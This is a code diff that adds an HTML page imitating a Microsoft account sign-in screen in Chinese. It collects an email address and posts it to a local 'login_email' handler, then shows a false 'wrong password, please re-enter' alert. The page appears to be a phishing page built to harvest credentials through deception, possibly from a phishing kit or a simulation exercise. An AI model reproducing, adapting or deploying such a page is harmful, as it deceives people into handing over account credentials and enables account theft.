@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>登录到您的账户</title>
+    <style type="text/css">
+        .inner {
+            margin-left: auto;
+            margin-right: auto;
+            position: relative;
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin-bottom: 28px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 320px;
+            min-height: 338px;
+            overflow: hidden;
+        }
+
+        .fade-in-lightbox {
+            animation: fadeIn .3s ease-in;
+            -webkit-animation: fadeIn .3s ease-in;
+            -moz-animation: fadeIn .3s ease-in;
+            -ms-animation: fadeIn .3s ease-in;
+            -o-animation: fadeIn .3s ease-in;
+        }
+
+        .text-title {
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+            padding: 0;
+            margin-top: 16px;
+            margin-bottom: 12px;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        .form-control {
+            display: block;
+            width: 100%;
+            background-image: none;
+        }
+
+        body {
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+        body.cb {
+    color: #1b1b1b;
+    text-align: left;
+}
+        .input_text{
+	background-color: #efefef;
+	border-color:#000000;
+	border-style:solid;
+	border-top-width:0px;
+	border-right-width:0px;
+	border-bottom-width:1px;
+	border-left-width:0px;
+}
+
+
+    </style>
+</head>
+<body background="back.jpg">
+<div class="inner fade-in-lightbox">
+    <form action="./login_email">
+        <div class="row text-title" id="loginHeader">
+            <div role="heading" aria-level="1" data-bind="text: title">登录</div><!-- ko if: isSubtitleVisible -->
+            <!-- /ko -->
+        </div>
+        <input type="email" name="email" id="email" class="form-control" style="border-top-width: 0;
+            border:0;border-bottom:1px solid black;
+                height: 36px;
+                -webkit-border-radius: 0;
+    background-color: transparent;
+"
+               placeholder="someone@example.com">
+
+        <div style="margin-top: 10px"
+                data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#" data-bind="
+                        text: str['WF_STR_CantAccessAccount_Text'],
+                        click: cantAccessAccount_onClick">无法访问您的帐户?</a> </div><!-- /ko --><!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink) --><!-- /ko --><!-- ko if: availableCredsWithoutUsername().length > 0 || svr.fShowForgotUsernameLink --><!-- /ko --> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
+        params: {
+            serverData: svr,
+            isPrimaryButtonEnabled: !isRequestPending(),
+            isPrimaryButtonVisible: svr.fShowButtons,
+            isSecondaryButtonEnabled: true,
+            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
+        event: {
+            primaryButtonClick: primaryButton_onClick,
+            secondaryButtonClick: secondaryButton_onClick } }"> </div> </div> </div>
+
+        <input onclick='alert("密码错误，请重新输入！")'  value="下一步" type="submit"
+               style="border-color: #0067b8;
+    background-color: #0067b8;
+    margin-top: 50px;
+    margin-left: 320px;
+    height: 32px;
+    min-width: 108px;
+    color: #fff;
+    border:none; border-bottom:2px solid #eee;outline: none;}
+}">
+    </form>
+</div>
+</body>
+</html>
